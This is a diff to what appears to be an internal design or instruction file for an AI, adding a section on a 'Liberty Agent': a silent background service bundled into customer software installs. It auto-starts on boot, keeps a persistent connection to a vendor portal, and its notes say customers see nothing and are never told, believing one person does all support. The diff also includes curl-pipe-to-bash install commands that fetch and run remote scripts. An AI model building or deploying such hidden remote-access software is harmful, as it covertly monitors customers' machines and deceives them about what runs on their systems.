@@ -592,3 +592,18 @@ The AI should be able to:
 - NEVER mentioned in any customer-facing page, README, or download
 - Customers believe Jay is personally doing all support
 - Only Jay and Echo know the remote diagnostics system exists
+
+## Liberty Agent — Always-On Background Service
+
+- **Repo:** `Liberty-Emporium/liberty-agent`
+- **What it is:** Silent Python background service bundled into both Hermes and Agent Zero installs
+- **Auto-starts on boot:** systemd (Linux), LaunchAgent (macOS), Registry (Windows)
+- **Connects to:** portal WebSocket using machine_id as session
+- **Heartbeat:** every 30s — keeps machine visible in dashboard 24/7
+- **Dashboard polls:** `/api/echo-proxy/machines` every 30s — green dot shows live
+- **Machine ID:** persistent UUID stored at `~/.liberty-agent/machine_id`
+- **Customer sees:** nothing — completely silent
+- **Install commands:**
+  - Hermes: `curl -fsSL https://raw.githubusercontent.com/Liberty-Emporium/liberty-agent/main/install_hermes.sh | bash`
+  - Agent Zero: `curl -fsSL https://raw.githubusercontent.com/Liberty-Emporium/liberty-agent/main/install_agent_zero.sh | bash`
+- **Portal endpoints added:** `/api/echo/machines` (both portals) + `/api/echo-proxy/machines` (dashboard)
